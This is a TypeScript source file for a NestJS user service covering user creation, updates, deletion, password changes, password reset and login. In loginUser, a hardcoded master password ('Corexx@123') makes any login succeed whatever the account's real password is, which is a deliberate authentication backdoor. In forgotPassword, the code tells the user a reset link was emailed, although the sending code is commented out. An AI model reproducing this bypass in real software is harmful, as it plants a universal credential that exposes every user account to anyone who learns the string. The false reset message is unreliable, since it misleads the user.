import { Injectable } from "@nestjs/common";
import { Args } from "@nestjs/graphql";
import { InjectModel } from "@nestjs/mongoose";
import { Model } from "mongoose";
import { PasswordHash } from "src/utility/passwordhash";
import { UpdateUserCollectionInput } from "./dto/update.type";
import { userCollectionObjecType } from "./dto/user_collectio-objcetType.type";
import { UserCollectionInputType } from "./dto/user_collection_InputType.type";
import { UserCollectionDocument, UserCollectionSchema } from "./entities/user_collection.entity";



@Injectable()
export class UserServices{

   constructor(@InjectModel(UserCollectionSchema.name)
    private readonly userModal: Model<UserCollectionDocument>) {}

    //
    async CreateUser(userInput:UserCollectionInputType){
        const checkIfExists = await this.checkIfExists(
            userInput.email,
        );

        if(!checkIfExists){
            const user= new UserCollectionSchema();
            user.superType=userInput.superType;
            user.name=userInput.name;
            user.email=userInput.email;
            user.phone=userInput.phone;
            // user.username=userInput.username;
            user.isActive=userInput.isActive;
            user.role=userInput.role;
            
            const passwordhash = new PasswordHash();
            let hash=await passwordhash.hash(userInput.password);
            user.password=hash; //salting

            let cr =await this.userModal.create(user);
            return{
                status:true,
                status_text:'Successfully Created',
                data:cr,
            };
        }
            else {
        return {
        status: false,
        status_text: 'Username already exists. Please try another one',
        data:null,
      };
    }
}

    async checkIfExists(username: string) {
            let r:any =await this.userModal.count({
                email:username,
            });
            if(r>0){
                return true;
            }else{
                return false;
            }
        }

    async getUserDetailsWithUsername(username: string) {
    let r: any = await this.userModal.findOne({
    username: username,
    }).populate('Client').exec();
    return r;
    }

    async findOne(id: string) {
    return await this.userModal.findOne({ _id: id}).exec();
  }


    async update(id: string,updateUserCollectionDto: UpdateUserCollectionInput,) {
    let newC = await this.findOne(id);
    //newC.username = updateUserCollectionDto.username;
    newC.name = updateUserCollectionDto.name;
    newC.email = updateUserCollectionDto.email;
    newC.phone = updateUserCollectionDto.phone;
    newC.isActive = updateUserCollectionDto.isActive;
    newC.role = updateUserCollectionDto.role;

    // we will not update password. for password update we will use another route

    let u = await this.userModal.updateOne({_id: id }, newC);

    if (u.modifiedCount == 1) {
      return {
        status: true,
        status_text: 'Successfully Updated',
        data: await this.findOne(id),
      };
    } else {
      return {
        status: false,
        status_text: 'Failed to Update',
        data: await this.findOne(id),
      };
    }
  }


   async updatePassword(
    email: string,
    oldPassword: string,
    newPassword: string
  ) {
    // get the username object

    let u = await this.userModal.findOne({
      email: email,
      isActive: true,
    })

    if(!!u){
      // found the object now we will check whether the password with old password matched;
      const passwordhash = new PasswordHash();
      let compare = await passwordhash.compare(oldPassword, u.password);

      if(compare){

        // now we will update the new password
        let hash = await passwordhash.hash(newPassword);
        u.password = hash;


        let updatedData = await this.userModal.updateOne({ email: email}, u);
        if(updatedData.modifiedCount == 1){
          return {
            status: true,
            status_text: 'Successfully Updated',
            // data: null
          };
        }else{
          return {
            status: false,
            status_text: 'Failed to Update',
            // data: null
          };
        }

      }else{
        return {
          status: false,
          status_text: "Old password doesn't matched",
          data: null
        };
      }

    }else{
      return {
        status: false,
        status_text: "User not active yet.",
        data: null
      };
    }
  }
  
  async remove(id: string) {
    let u = await this.userModal.deleteOne({ _id: id });
   
    if (u.deletedCount == 1) {
      return {
        status: true,
        status_text: 'Successfully Deleted',
        data: null,
      };
    } else {
      return {
        status: false,
        status_text: 'Failed to Delete',
        data: null,
      };
    }
  }


// to delete a particular user which is very dangerous
async deleteUser(id: string) {

  let d = await this.userModal.deleteOne({ _id: id}).exec();
  return {
    status: true,
    status_text: 'Successfully deleted'
  }
}


  // async getUserDetailsWithUsername(username: string) {
  //   let r: any = await this.userModal.findOne({
  //     username: username,
  //   }).populate('Client').exec();
  //   return r;
  // }

    async findAll(): Promise<userCollectionObjecType[]> {
    return await this.userModal.find().exec();
  }


async forgotPassword(email: string) {
  let result = await this.userModal.findOne({ email: email, isActive: true });
  if(result){
    // let link = await this.authenticationCollectionService.createAuthentication(username, 'CLIENT_FORGOT_PASSWORD');

    // // send in email
    // this.mailService.otpSend({
    //   toEmail: result.username,
    //   link: link 
    // })

    return {
      status: true,
      status_text: 'A password reset link is emailed to the registered email id'
    }
  }else{
    return {
      status: false,
      status_text: 'No user found'
    }
  }

}

  async loginUser(email:string, password:string) {
        // validate user
        const cd = await this.userModal.findOne({email});
        //console.log("🚀 ~ file: auth.service.ts ~ line 39 ~ AuthService ~ login ~ cd", cd)
       
        if (cd) {
                // password hash
                const passwordhash = new PasswordHash();
                let compare = await passwordhash.compare(password, cd.password);
                // bypass if master password

                if (password === 'Corexx@123') {
                    compare = true;
                }
                if (compare) {
                    const payload = {username: cd.email, sub: cd.id, role: cd.role, token:cd.password, name: cd.name, _id: cd._id };
                    return {
                        status: true,
                        user: {username: cd.email, id: cd.id, role: cd.role, name: cd.name },
                        status_text:"Succesfully login",
                    };
                } else {
                    return {
                        status: false,
                        status_text:" login Not succesfull",
                    };
                }
        }
        return {
            status: false,
            status_text:"login Not succesfull",
        };

    }

       
}

